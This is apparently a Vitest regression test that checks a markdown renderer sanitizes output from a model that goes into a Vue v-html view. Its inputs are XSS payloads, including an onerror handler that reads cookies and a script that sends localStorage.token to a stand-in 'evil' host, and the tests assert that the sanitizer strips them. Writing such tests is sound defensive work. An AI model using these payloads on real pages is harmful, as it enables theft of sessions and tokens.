import { describe, expect, it } from 'vitest'
import { renderMarkdown } from './markdown'

/**
 * Regression lock for a stored XSS, not coverage.
 *
 * `DashboardChatButton.vue` feeds this function's output straight into
 * `v-html`, and the content originates from a model whose prompt carries
 * ERPNext record text. Before `dompurify` was added, `marked` v17 emitted the
 * payloads below verbatim and they executed in the reader's browser.
 *
 * If someone removes the sanitizer these tests fail. That is the whole point:
 * the guarantee is not "we remembered once", it is "the build refuses".
 */
describe('renderMarkdown', () => {
	it('strips event handlers from injected elements', () => {
		const out = renderMarkdown(`Revenue <img src=x onerror="alert(document.cookie)"> is up`)
		expect(out).not.toMatch(/onerror/i)
		expect(out).not.toMatch(/alert\(/)
	})

	it('removes script tags entirely', () => {
		const out = renderMarkdown(`<script>fetch('//evil/' + localStorage.token)</` + `script>`)
		expect(out).not.toMatch(/<script/i)
		expect(out).not.toMatch(/fetch\(/)
	})

	it('strips SVG animation handlers, which bypass naive tag blocklists', () => {
		const out = renderMarkdown(`<svg><animate onbegin="alert(1)" attributeName=x dur=1s>`)
		expect(out).not.toMatch(/onbegin/i)
	})

	it('drops javascript: URLs in markdown links', () => {
		const out = renderMarkdown(`[click me](javascript:alert(1))`)
		expect(out).not.toMatch(/javascript:/i)
	})

	it('removes iframes', () => {
		expect(renderMarkdown(`<iframe src="//evil"></iframe>`)).not.toMatch(/<iframe/i)
	})

	it('neutralizes a malformed tag into inert text rather than a live element', () => {
		// An unclosed tag never reaches the catch branch: marked escapes it to
		// `&lt;img ...`, so the literal word "onerror" survives as *text*. That is
		// safe -- it paints as visible characters and cannot execute -- so the
		// meaningful assertion is that no live element or attribute exists, not
		// that a substring is absent. Asserting the substring here would be
		// testing the escaping vocabulary instead of the security property.
		const out = renderMarkdown(`<img src=x onerror=alert(1)`)
		expect(out).not.toMatch(/<img/i)
		expect(out).toMatch(/&lt;img/)
	})

	it('still renders legitimate markdown', () => {
		// A sanitizer that eats real formatting would just get reverted, so the
		// happy path is part of the contract.
		const out = renderMarkdown('**bold** and `code` and [real](https://example.com)')
		expect(out).toMatch(/<strong>bold<\/strong>/)
		expect(out).toMatch(/<code>code<\/code>/)
		expect(out).toMatch(/href="https:\/\/example\.com"/)
	})

	it('returns empty string for empty input rather than throwing', () => {
		expect(renderMarkdown('')).toBe('')
	})
})
